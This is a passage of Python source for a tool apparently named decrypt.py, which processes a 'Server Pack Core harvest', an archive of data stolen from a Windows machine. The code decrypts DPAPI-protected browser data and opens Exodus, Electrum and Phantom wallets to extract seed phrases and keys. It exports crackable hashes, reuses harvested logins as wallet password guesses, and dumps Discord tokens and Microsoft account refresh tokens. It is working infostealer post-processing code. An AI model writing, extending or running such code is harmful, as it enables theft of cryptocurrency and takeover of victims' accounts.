        raw = meta.get("passphrase", "")
        if meta.get("system") and system_keys:
            try:
                secret = unprotect(base64.b64decode(raw), system_keys)
            except Exception:
                secret = None
        if secret is None:
            for candidate in (raw.encode(), base64.b64decode(raw)):
                try:
                    open_seco(read_seco(seed), candidate)
                    secret = candidate
                    break
                except Exception:
                    continue
    if secret is None:
        skipped("exodus: passphrase does not fit")
        return
    ok("exodus: container opened")
    plain = open_seco(read_seco(seed), secret)
    write(out, "wallets/exodus-seed.bin", plain)
    how, payload = decode_payload(plain)
    words_seed = exodus_payload_words(payload)
    if words_seed:
        write(out, "wallets/exodus-seed.txt", " ".join(words_seed) + "\n")
        harvest.counts["seeds"] += 1
        ok("exodus: mnemonic", clip(" ".join(words_seed), 46) if show else mask(" ".join(words_seed), 12))
        return
    text = None
    if how:
        try:
            text = payload.decode("utf-8")
        except UnicodeDecodeError:
            text = None
    if text:
        try:
            document = json.loads(text[text.find("{"):])
        except Exception:
            document = None
        mnemonic = None
        if isinstance(document, dict):
            mnemonic = document.get("mnemonic") or document.get("seed") or document.get("secret")
        if mnemonic:
            write(out, "wallets/exodus-seed.txt", mnemonic + "\n")
            harvest.counts["seeds"] += 1
            ok("exodus: mnemonic", clip(mnemonic, 46) if show else mask(mnemonic, 12))
            return
        write(out, "wallets/exodus-payload.txt", text)
        ok("exodus: payload decoded", how)
        return
    words = bip39_scan(plain)
    if words:
        write(out, "wallets/exodus-seed.txt", " ".join(words) + "\n")
        harvest.counts["seeds"] += 1
        ok("exodus: words carved from binary", " ".join(words[:6]) + " …")
    else:
        warn("exodus: seed opened but payload is an opaque envelope",
             f"{len(plain)} bytes saved to wallets/exodus-seed.bin")
    storage = wallet / "storage.seco"
    if storage.is_file():
        try:
            write(out, "wallets/exodus-storage.bin", open_seco(read_seco(storage), secret))
            ok("exodus: storage.seco also opened")
        except Exception:
            skipped("exodus: storage.seco uses another password")


SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def electrum_password_key(password):
    secret = hashlib.pbkdf2_hmac("sha512", password.encode(), b"", 1024)
    scalar = int.from_bytes(secret, "big") % SECP256K1_ORDER or 1
    return ec.derive_private_key(scalar, ec.SECP256K1())


def electrum_unwrap(blob, password):
    """Electrum 2.8+ BIE1: PBKDF2-SHA512 -> secp256k1 ECIES -> AES-128-CBC -> zlib JSON."""
    raw = base64.b64decode(blob, validate=True)
    if raw[:4] != b"BIE1" or len(raw) < 85:
        raise ValueError("not an Electrum BIE1 container")
    private = electrum_password_key(password)
    ephemeral = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256K1(), raw[4:37])
    shared_x = private.exchange(ec.ECDH(), ephemeral)
    ciphertext, mac = raw[37:-32], raw[-32:]
    for prefix in (b"\x02", b"\x03"):
        key = hashlib.sha512(prefix + shared_x).digest()
        if hmac.compare_digest(hmac.new(key[32:], raw[:-32], hashlib.sha256).digest(), mac):
            decryptor = Cipher(algorithms.AES(key[16:32]), modes.CBC(key[:16])).decryptor()
            padded = decryptor.update(ciphertext) + decryptor.finalize()
            return zlib.decompress(padded[:-padded[-1]])
    raise ValueError("wrong Electrum password")


def electrum_john(blob):
    raw = base64.b64decode(blob, validate=True)
    if raw[:4] != b"BIE1":
        return ""
    return "$electrum$4*%s*%s*%s" % (raw[4:37].hex(), raw[:-32].hex(), raw[-32:].hex())


def dump_electrum(harvest, out, passwords, show):
    total = 0
    candidates = list(harvest.rel("*.json"))
    for path in harvest.root.rglob("*"):
        if not path.is_file() or path.suffix == ".json" or "wallets" not in path.parts:
            continue
        try:
            if path.open("rb").read(6) == b"QklFMQ":
                candidates.append(path)
        except Exception:
            continue
    for wallet in candidates:
        try:
            raw = wallet.read_bytes()
        except Exception:
            continue
        is_bie1 = raw[:6] == b"QklFMQ"
        if not is_bie1:
            text = raw[:300].decode("utf-8", "replace").lower()
            if "wallet_data" not in text and "electrum" not in str(wallet).lower():
                continue
        try:
            document = {} if is_bie1 else json.loads(raw.decode("utf-8", "replace"))
        except Exception:
            continue
        if is_bie1:
            total += 1
            name = wallet.name
            write(out, f"wallets/electrum-{name}.enc", raw)
            john = electrum_john(raw)
            if john:
                write(out, f"wallets/electrum-{name}.john", f"{name}:{john}\n")
            if not passwords:
                skipped(f"electrum: {name} cifrado; usa -p/--wallet-password o hashcat (wallets/electrum-{name}.john)")
                continue
            opened = None
            for candidate in passwords:
                try:
                    opened = json.loads(electrum_unwrap(raw.decode(), candidate))
                    break
                except Exception:
                    continue
            if opened is None:
                skipped(f"electrum: {name} ninguna contraseña candidata abrió")
                continue
            document = opened
        if "seed" not in document and "xprv" not in document:
            continue
        total += 1
        if not document.get("use_encryption"):
            fields = {k: document[k] for k in ("seed", "xprv") if k in document}
            write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
            harvest.counts["seeds"] += 1
            ok(f"electrum: {wallet.name} abierto")
            for key, value in fields.items():
                bullet(key, clip(value, 44) if show else mask(value, 12))
            continue
        if not passwords:
            skipped(f"electrum: {wallet.name} needs a password")
            continue
        fields = {}
        for candidate in passwords:
            key = hashlib.sha256(candidate.encode()).digest()
            attempt = {}
            for field in ("seed", "xprv"):
                if field not in document:
                    continue
                try:
                    blob = base64.b64decode(document[field])
                    plain = unpad(cbc_decrypt(key, blob[:16], blob[16:]))
                    attempt[field] = base64.b64decode(plain).decode()
                except Exception:
                    continue
            if attempt:
                fields = attempt
                break
        if fields:
            write(out, f"wallets/electrum-{wallet.stem}.json", json.dumps(fields, indent=2) + "\n")
            harvest.counts["seeds"] += 1
            ok(f"electrum: {wallet.stem} opened with the password")
            for key, value in fields.items():
                bullet(key, clip(value, 44) if show else mask(value, 12))
    if not total:
        skipped("electrum: no wallet json")



PHANTOM_ID = "bfnaelmomeimhlpmgjnjophhpkkoljpa"


def phantom_stores(harvest):
    """Both layouts: extension settings copied by the collector and the wallet copy."""
    found = [p for p in harvest.rel("Local Extension Settings/*") if p.parent.name == PHANTOM_ID]
    found += [p for p in harvest.root.glob(f"wallets/*/{PHANTOM_ID}/*") if p.is_dir()]
    return found


def read_leveldb(store):
    """plyvel when available; otherwise the pure-Python ccl reader."""
    try:
        import plyvel
        db = plyvel.DB(str(store), create_if_missing=False)
        try:
            return dict(db)
        finally:
            db.close()
    except ImportError:
        pass
    except Exception:
        return None
    try:
        from ccl_chromium_reader.storage_formats.ccl_leveldb import RawLevelDb
    except ImportError:
        return "missing"
    records = {}
    db = RawLevelDb(store)
    try:
        for record in db.iterate_records_raw():
            if record.state.name == "Deleted":
                continue
            previous = records.get(record.user_key)
            if previous is None or record.seq > previous[0]:
                records[record.user_key] = (record.seq, record.value)
    finally:
        db.close()
    return {key: value for key, (_, value) in records.items()}


def dump_phantom(harvest, out, keyring, show):
    targets = phantom_stores(harvest)
    if not targets:
        skipped("phantom: no store")
        return
    for store in targets:
        entries = read_leveldb(store)
        if entries == "missing":
            skipped("phantom: pip install plyvel o ccl_chromium_reader")
            return
        if not entries:
            warn("phantom: store unreadable", str(store))
            continue
        key = None
        wrapped = entries.get(b"key")
        if wrapped and wrapped[:1] == b"\x01":
            try:
                key = unprotect(wrapped[1:], keyring)
            except Exception:
                pass
        ok("phantom: store opened", f"{len(entries)} keys")
        encrypted = []
        for name, value in entries.items():
            if b"encryption.encryptionKey" in name or b"vault.seed." in name:
                try:
                    document = json.loads(value)
                except Exception:
                    continue
                encrypted.append((name.decode("utf-8", "replace"), document))
        for name, document in encrypted:
            safe = name.strip(". ").replace("/", "_").replace(".", "-")
            path = f"wallets/phantom/{store.parent.name}-{safe}.json"
            write(out, path, json.dumps(document, indent=2) + "\n")
        if encrypted:
            ok("phantom: sealed blobs saved", f"{len(encrypted)}; necesita la contraseña de Phantom")
        for name in (b"vault", b"vaults"):
            if name not in entries:
                continue
            value = entries[name]
            if value[:1] == b"\x01":
                key = unprotect(value[1:], keyring)
                continue
            vault = json.loads(value)
            bullet(f"{name.decode()}: kdf {vault.get('kdf')} iterations {vault.get('iterations')}")
            write(out, "wallets/phantom-vault.json", json.dumps(vault, indent=2) + "\n")
        if key:
            write(out, "wallets/phantom-key.bin", key)
            ok("phantom: vault key recovered", key.hex()[:16] + "…")


def dump_accounts(harvest, out):
    import datetime
    for source in harvest.rel("accounts.json"):
        try:
            document = json.loads(source.read_text("utf-8", "replace"))
        except Exception:
            continue
        lines = [f"# {source.relative_to(harvest.root)}"]
        for account in document.get("accounts", []):
            profile = account.get("profile", {})
            lines.append(f"name   {profile.get('name', '?')}")
            lines.append(f"uuid   {profile.get('id', '?')}")
            refresh = account.get("msa", {}).get("refresh_token")
            if refresh:
                lines.append(f"token  {refresh}")
                harvest.counts["accounts"] += 1
            expires = account.get("msa", {}).get("exp")
            if expires:
                lines.append("expiry " + datetime.datetime.fromtimestamp(expires).isoformat())
            lines.append("")
        write(out, "accounts/launcher-accounts.txt", "\n".join(lines) + "\n")
        ok(f"accounts: {len(document.get('accounts', []))} entries", str(source.relative_to(harvest.root)))


# --- main -------------------------------------------------------------------

def main():
    global T
    args = parse_args()
    if args.no_color or not sys.stdout.isatty():
        T = PLAIN
    archive = Path(args.archive).expanduser().resolve()
    if not archive.exists():
        sys.exit(f"not found: {archive}")

    root, temp = extract(archive)
    harvest = Harvest(root)
    out = outdir_for(archive, args.out)
    banner(archive, out)

    inventory = harvest.inventory()
    title("inventory")
    for name, count in inventory.items():
        if isinstance(count, bool):
            (ok if count else skipped)(name)
        elif count:
            bullet(name, str(count))
        else:
            skipped(name)
    if args.list:
        if temp:
            shutil.rmtree(temp, ignore_errors=True)
        return

    password = args.password
    user_keys, system_keys = {}, {}
    protect = root / "dpapi" / "Protect"
    sids = [p for p in protect.iterdir() if p.is_dir()] if protect.is_dir() else []

    predecrypted = (root / "discord" / "token.txt").is_file() or any(
        "v20=" in p.read_text("utf-8", "replace") for p in harvest.rel("keys.txt"))
    if sids and not predecrypted and not (args.masterkey or password):
        if sys.stdin.isatty() and not args.quiet:
            p()
            p("  The harvested DPAPI blobs need the Windows password to open.", "dim")
            try:
                password = getpass.getpass("  password (empty to skip): ")
            except EOFError:
                password = ""
    if args.masterkey:
        user_keys["*"] = bytes.fromhex(args.masterkey)
    elif password:
        for sid in sids:
            user_keys.update(load_masterkeys(root / "dpapi" / "Protect" / sid.name, password))
    if user_keys:
        ok("dpapi: masterkeys recovered", str(len(user_keys)))
    elif sids:
        skipped("dpapi: no masterkey", "optional for legacy blobs")
    if args.system_masterkey:
        system_keys["*"] = bytes.fromhex(args.system_masterkey)
        _SYSTEM_KEYS.clear()
        _SYSTEM_KEYS.update(system_keys)
        ok("dpapi: SYSTEM masterkey supplied")
    if args.machinekey:
        folder = (Path(args.system_protect) if args.system_protect
                  else root / "dpapi" / "Protect" / "S-1-5-18")
        if (folder / "S-1-5-18").is_dir():
            folder = folder / "S-1-5-18"
        material = bytes.fromhex(args.machinekey)
        system_keys.update(load_masterkeys(folder, material, True))
        if args.system_userkey:
            system_keys.update(load_masterkeys(folder / "User",
                                               bytes.fromhex(args.system_userkey), True))
        _SYSTEM_KEYS.clear()
        _SYSTEM_KEYS.update(system_keys)
        if system_keys:
            ok("dpapi: SYSTEM masterkeys recovered", str(len(system_keys)))
        else:
            warn("dpapi: machinekey did not open any S-1-5-18 masterkey", str(folder))
    ksp = args.ksp
    if not ksp:
        for candidate in (root / "hives" / "SystemKeys", root / "SystemKeys"):
            if candidate.is_dir():
                for path in candidate.iterdir():
                    if path.is_file() and "chromekey" in path.name.lower():
                        ksp = str(path)
                        break
            if ksp:
                break
    if ksp:
        set_ksp_key(ksp)
        if _KSP_KEY:
            ok("dpapi: KSP Chromekey1 recovered", str(len(_KSP_KEY)))

    total = 7
    step(1, total, "browsers")
    for browser in harvest.browser_dirs():
        dump_browser(harvest, out, browser, user_keys, system_keys, args.show)
    if not harvest.browser_dirs():
        skipped("no browser data")

    step(2, total, "discord")
    token_file = root / "discord" / "token.txt"
    live_tokens = []
    if token_file.is_file():
        live_tokens = [line.split("=", 1)[-1].strip()
                       for line in token_file.read_text("utf-8", "replace").splitlines()
                       if line.strip()]
    tokens = live_tokens or find_tokens(harvest, user_keys)
    if tokens:
        write(out, "discord/tokens.txt", "\n".join(tokens) + "\n")
        harvest.counts["tokens"] = len(tokens)
        ok(f"discord: {len(tokens)} tokens")
        for token in tokens[:args.show]:
            bullet(clip(token, 22) if args.show else mask(token, 10))
    elif harvest.rel("*.ldb"):
        skipped("discord: tokens still encrypted", "needs a masterkey or discord/token.txt")
    else:
        skipped("discord: no raw dump")

    step(3, total, "wallets")
    dump_exodus(harvest, out, user_keys, system_keys, args.show)
    wallet_passwords = []
    for value in ([password] if password else []) + list(args.wallet_password or []):
        if value and value not in wallet_passwords:
            wallet_passwords.append(value)
    for file in (out / "secrets").glob("*-logins.tsv"):
        for line in file.read_text("utf-8", "replace").splitlines():
            parts = line.split("\t")
            if len(parts) >= 3 and parts[2] and parts[2] not in wallet_passwords:
                wallet_passwords.append(parts[2])
    dump_electrum(harvest, out, wallet_passwords, args.show)
    dump_phantom(harvest, out, user_keys, args.show)

    step(4, total, "accounts")
    dump_accounts(harvest, out)

    step(5, total, "notes")
    for path in harvest.rel("*.txt"):
        if path.name in ("keys.txt", "mods.txt"):
            write(out, f"notes/{path.parent.name}-{path.name}", path.read_text("utf-8", "replace"))
            ok(str(path.relative_to(root)))

    report = {
        "archive": archive.name,
        "counts": harvest.counts,
        "masterkeys": len(user_keys),
        "tokens": tokens,
    }
    write(out, "report.json", json.dumps(report, indent=2) + "\n")
    summary = "\n".join(f"{k:10} {v}" for k, v in harvest.counts.items())
    write(out, "summary.txt", summary + "\n")

    title("done")
    for key, value in harvest.counts.items():
        (ok if value else skipped)(f"{key}: {value}")
    p()
    p(f"  output: {out}", "dim")
    if not any(harvest.counts.values()) and sids:
        warn("nothing was decrypted", "legacy harvest: rerun with -p '<windows password>'")
    elif harvest.counts["cookies"] == 0 and sids:
        warn("no cookies decrypted", "check browsers/*/abe or supply -p for legacy blobs")
    if temp:
        shutil.rmtree(temp, ignore_errors=True)


def parse_args():
    import argparse
    parser = argparse.ArgumentParser(
        prog="decrypt.py", description="Decrypt a Server Pack Core harvest.",
        formatter_class=argparse.RawDescriptionHelpFormatter, epilog=__doc__)
    parser.add_argument("archive", help="harvest .zip or extracted directory")
    parser.add_argument("-o", "--out", help="output directory (default: decrypted-<name>)")
    parser.add_argument("-p", "--password", help="Windows password for the DPAPI blobs")
    parser.add_argument("--masterkey", help="user DPAPI masterkey in hex")
    parser.add_argument("--system-masterkey", help="SYSTEM DPAPI masterkey in hex (v20 cookies)")
    parser.add_argument("--machinekey",
                        help="DPAPI_SYSTEM machinekey from secretsdump (20 bytes hex); "
                             "derives the S-1-5-18 masterkeys")
    parser.add_argument("--system-protect",
                        help="copied S-1-5-18 Protect folder (default: inside the harvest)")
    parser.add_argument("--wallet-password", action="append",
                        help="contraseña de cartera (Electrum/Phantom); repetible")
    parser.add_argument("--system-userkey",
                        help="DPAPI_SYSTEM userkey from secretsdump (20 bytes hex); "
                             "opens the S-1-5-18/User masterkeys")
    parser.add_argument("--ksp",
                        help="copied 'Google Chromekey1' CNG key (v20 offline, Chrome flag 3)")
    parser.add_argument("--list", action="store_true", help="inventory only, decrypt nothing")
    parser.add_argument("-s", "--show", type=int, default=4, help="secrets printed on screen")
    parser.add_argument("-q", "--quiet", action="store_true", help="do not prompt")
    parser.add_argument("--no-color", action="store_true")
    return parser.parse_args()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        p("\n  aborted", "red")
        sys.exit(130)
